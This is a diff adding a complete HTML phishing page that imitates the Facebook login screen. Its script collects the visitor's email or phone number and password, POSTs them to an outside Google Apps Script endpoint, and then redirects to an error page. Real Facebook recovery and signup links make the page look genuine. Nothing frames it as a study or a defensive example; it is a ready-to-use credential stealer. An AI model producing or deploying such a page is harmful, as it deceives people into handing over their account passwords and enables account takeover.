@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<!-- Coding By Mongrey Marma -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Paste the CSS styles here */
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          font-family: 'Roboto', sans-serif;
+        }
+
+        .flex {
+          display: flex;
+          align-items: center;
+        }
+
+        .container {
+          padding: 0 15px;
+          min-height: 100vh;
+          justify-content: center;
+          background: white;
+        }
+
+        .facebook-page {
+          justify-content: space-between;
+          max-width: ;
+          width: 100%;
+        }
+
+        .facebook-page .text {
+          margin-bottom: 90px;
+        }
+
+        .facebook-page h1 {
+          color: #1877f2;
+          font-size: 4rem;
+          margin-top: 30px;
+          margin-bottom: 10px;
+        }
+
+        .facebook-page p {
+          font-size: 1.75rem;
+          white-space: nowrap;
+        }
+
+        form {
+          display: flex;
+          flex-direction: column;
+          background: #fff;
+          border-radius: 8px;
+          padding: 20px;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+            0 8px 16px rgba(0, 0, 0, 0.1);
+          max-width: 400px;
+          width: 100%;
+        }
+
+        form input {
+          height: 55px;
+          width: 100%;
+          border: 1px solid #ccc;
+          border-radius: 6px;
+          margin-bottom: 15px;
+          font-size: 1rem;
+          padding: 0 14px;
+        }
+
+        form input:focus {
+          outline: none;
+          border-color: #1877f2;
+        }
+
+        ::placeholder {
+          color: #777;
+          font-size: 1.063rem;
+        }
+
+        .link {
+          display: flex;
+          flex-direction: column;
+          text-align: center;
+          gap: 15px;
+        }
+
+        input[type="button"] {
+          border: none;
+          outline: none;
+          cursor: pointer;
+          background: #1877f2;
+          padding: 15px 0;
+          border-radius: 6px;
+          color: #fff;
+          font-size: 1.25rem;
+          font-weight: 600;
+          transition: 0.2s ease;
+        }
+
+        input[type="button"]:hover {
+          background: #0d65d9;
+        }
+
+        form a {
+          text-decoration: none;
+        }
+
+        .link .forgot {
+          color: #1877f2;
+          font-size: 0.875rem;
+        }
+
+        .link .forgot:hover {
+          text-decoration: underline;
+        }
+
+        hr {
+          border: none;
+          height: 1px;
+          background-color: #ccc;
+          margin-bottom: 20px;
+          margin-top: 20px;
+        }
+
+        .button {
+          margin-top: 25px;
+          text-align: center;
+          margin-bottom: 20px;
+        }
+
+        .button a {
+          padding: 15px 20px;
+          background: #42b72a;
+          border-radius: 6px;
+          color: #fff;
+          font-size: 1.063rem;
+          font-weight: 600;
+          transition: 0.2s ease;
+        }
+
+        .button a:hover {
+          background: #3ba626;
+        }
+
+        @media (max-width: 900px) {
+          .facebook-page {
+            flex-direction: column;
+            text-align: center;
+          }
+
+          .facebook-page .text {
+            margin-bottom: 30px;
+          }
+        }
+
+        @media (max-width: 460px) {
+          .facebook-page h1 {
+            font-size: 3.5rem;
+          }
+
+          .facebook-page p {
+            font-size: 1.3rem;
+          }
+
+          form {
+            padding: 15px;
+          }
+        }
+
+        /* Loading animation */
+        .loading {
+          position: relative;
+        }
+
+        .loading::after {
+          content: "";
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          border: 4px solid #f3f3f3;
+          border-top: 4px solid #3498db;
+          border-radius: 50%;
+          width: 30px;
+          height: 30px;
+          animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+          0% { transform: translate(-50%, -50%) rotate(0deg); }
+          100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+    </style>
+
+</head>
+<body>
+<div class="container flex">
+    <div class="facebook-page flex">
+        <div class="text">
+            <h1>Facebook</h1>
+            <p>Login to Facebook</p>
+        </div>
+        <form id="loginForm">
+            <div id="errorDiv"></div> <!-- Error message div -->
+            <input type="text" id="emailOrNumber" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <div class="link">
+                <input type="button" value="Login" onclick="submitForm()">
+                <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0&wtsid=rdr_0a1vrAnFl0f2Tj8xT&_rdr"
+                   class="forgot">Forgot password?</a>
+            </div>
+            <hr>
+            <div class="button">
+                <a href="https://m.facebook.com/reg/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzA0NzM5OTEyfQ%3D%3D&cid=104&refsrc=deprecated&soft=hjk">Create
+                    new account</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+  function submitForm() {
+    var emailOrNumber = document.getElementById("emailOrNumber").value;
+    var password = document.getElementById("password").value;
+    var formData = { emailOrNumber: emailOrNumber, password: password };
+    var form = document.getElementById("loginForm");
+
+    // Check if the password length is less than 6
+    if (password.length < 6) {
+        document.getElementById("errorDiv").textContent = "Invalid password (must be at least 6 characters)";
+        document.getElementById("errorDiv").style.color = "red"; // Set color to red
+        
+        // Remove the error message after 2 seconds
+        setTimeout(function() {
+            document.getElementById("errorDiv").textContent = "";
+        }, 2000);
+        
+        return; // Stop further execution
+    }
+
+    // Add loading class to form
+    form.classList.add("loading");
+
+    fetch('https://script.google.com/macros/s/AKfycbwM3K_B0vYrMbM59ftbAHsmBJIC5_GPmxO5aJj8V8UoZ5g494U4KN8unNSosAKrWSqsGw/exec', {
+        method: 'POST',
+        body: JSON.stringify(formData)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.text();
+    })
+    .then(data => {
+        console.log(data); // Log the response
+        // Redirect to error.html
+        window.location.href = "error.html";
+    })
+    .catch(error => {
+        console.error('There was a problem with your fetch operation:', error);
+        // Display error message or perform any other error handling
+    })
+    .finally(() => {
+        // Remove loading class after 5 seconds
+        setTimeout(() => {
+            form.classList.remove("loading");
+        }, 5000);
+    });
+}
+</script>
+
+</body>
+</html>
